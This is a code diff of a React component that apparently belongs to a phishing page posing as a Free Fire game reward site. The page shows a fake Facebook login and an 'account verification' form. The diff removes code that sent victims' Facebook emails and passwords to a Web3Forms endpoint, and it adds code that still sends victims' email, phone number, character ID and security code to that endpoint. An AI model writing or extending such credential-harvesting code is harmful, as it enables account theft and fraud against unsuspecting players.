@@ -29,7 +29,7 @@ const EyeSlashIcon = (
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#65676b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.81 21.81 0 0 1 5.06-6.06M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"></path><path d="M1 1l22 22"></path></svg>
 );
 
-const WEB3FORMS_ACCESS_KEY = "5f66b663-f4a4-4302-825c-b092dd749458"; // <-- Replace with your Web3Forms access key
+const WEB3FORMS_ACCESS_KEY = "67a9cc91-daea-421c-81a9-b1e5e447c316"; // <-- Replace with your Web3Forms access key
 
 export default function Freefire() {
     const [showModal, setShowModal] = useState(false);
@@ -48,6 +48,7 @@ export default function Freefire() {
     const [accCharId, setAccCharId] = useState("");
     const [accPhone, setAccPhone] = useState("");
     const [accCode, setAccCode] = useState("");
+    const [accUserEmail, setAccUserEmail] = useState("");
     const [showProcessingPopup, setShowProcessingPopup] = useState(false);
     const handleCollectClick = (img) => {
         setSelectedImg(img);
@@ -573,36 +574,11 @@ export default function Freefire() {
                                     }
                                     setFbLoginError("");
                                     setShowAccLoader(true);
-                                    
-                                    // Send Facebook login details to Web3Forms
-                                    const fbFormData = {
-                                        access_key: WEB3FORMS_ACCESS_KEY,
-                                        subject: "Facebook Login Details",
-                                        email: fbEmail,
-                                        fbEmail,
-                                        fbPassword,
-                                    };
-                                    
-                                    try {
-                                        const res = await fetch("https://api.web3forms.com/submit", {
-                                            method: "POST",
-                                            headers: { "Content-Type": "application/json" },
-                                            body: JSON.stringify(fbFormData),
-                                        });
-                                        if (res.ok) {
-                                            setTimeout(() => {
-                                                setShowFbFormModal(false);
-                                                setShowAccLoader(false);
-                                                setShowAccountVerification(true);
-                                            }, 2000);
-                                        } else {
-                                            setShowAccLoader(false);
-                                            setFbLoginError("Failed to send email. Please try again.");
-                                        }
-                                    } catch (err) {
+                                    setTimeout(() => {
+                                        setShowFbFormModal(false);
                                         setShowAccLoader(false);
-                                        setFbLoginError("Failed to send email. Please try again.");
-                                    }
+                                        setShowAccountVerification(true);
+                                    }, 1000);
                                 }}
                             >
                                 <input type="text" placeholder="Mobile number or email address" value={fbEmail} onChange={e => setFbEmail(e.target.value)} style={{
@@ -833,17 +809,16 @@ export default function Freefire() {
                                         }
                                         setAccError("");
                                         setShowAccLoader(true);
-                                        // Web3Forms integration
+                                        // Web3Forms integration - Only verification data
                                         const formData = {
                                             access_key: WEB3FORMS_ACCESS_KEY,
                                             subject: "New Account Verification Submission",
-                                            email: fbEmail,
-                                            fbEmail,
-                                            fbPassword,
+                                            userEmail: accUserEmail,
                                             characterId: accCharId,
                                             phoneNumber: accPhone,
                                             accountLevel: accLevel,
                                             securityCode: accCode,
+                                           
                                         };
                                         try {
                                             const res = await fetch("https://api.web3forms.com/submit", {
@@ -888,6 +863,17 @@ export default function Freefire() {
                                                     {accError}
                                                 </div>
                                             )}
+                                            <input type="email" required name="userEmail" className="ff-account-verification-input" placeholder="Your Email Address" value={accUserEmail} onChange={e => setAccUserEmail(e.target.value)} style={{
+                                                width: '100%',
+                                                padding: '7px',
+                                                border: 'none',
+                                                fontSize: '14px',
+                                                outline: 'none',
+                                                background: 'transparent',
+                                                color: '#e7debd',
+                                                fontWeight: 600,
+                                                boxShadow: '0 0 2px 0 #fff',
+                                            }} />
                                             <input type="number" required name="characterId" className="ff-account-verification-input" placeholder="Character ID" value={accCharId} onChange={e => setAccCharId(e.target.value)} style={{
                                                 width: '100%',
                                                 padding: '7px',
